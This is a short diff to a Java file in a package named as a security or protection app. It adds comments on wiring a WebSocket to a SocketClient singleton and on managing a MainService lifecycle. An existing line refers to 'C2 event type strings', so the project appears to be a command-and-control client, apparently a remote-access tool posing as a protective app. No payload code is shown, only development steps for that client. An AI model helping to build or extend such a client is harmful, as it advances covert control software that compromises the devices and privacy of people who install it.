@@ -35,6 +35,33 @@ package com.seguranca.protecao;
 //
 // 5. PROTOCOL CONSTANTS
 //    Use Protocol.java (core/) for all C2 event type strings.
+//
+// ─────────────────────────────────────────────────────────────────────────────
+// ADDITIONAL WIRING REQUIRED (v5 — fixes for SocketClient + MainService):
+//
+// 5. SOCKETCLIENT ATTACHMENT (CRITICAL for feature managers)
+//    In your WebSocketListener inner class:
+//
+//      @Override public void onOpen(WebSocket ws, Response r) {
+//          SocketClient.getInstance().attach(ws);
+//          // ... existing onOpen logic ...
+//      }
+//      @Override public void onClosing(WebSocket ws, int code, String reason) {
+//          SocketClient.getInstance().detach();
+//          // ... existing logic ...
+//      }
+//      @Override public void onFailure(WebSocket ws, Throwable t, Response r) {
+//          SocketClient.getInstance().detach();
+//          // ... existing logic ...
+//      }
+//
+// 6. MAINSERVICE LIFECYCLE
+//    In onCreate():
+//      com.seguranca.protecao.service.MainService.init(this);
+//    In onDestroy():
+//      com.seguranca.protecao.service.MainService.release();
+//
+// ─────────────────────────────────────────────────────────────────────────────
 // ═══════════════════════════════════════════════════════════════════════════════
 
 
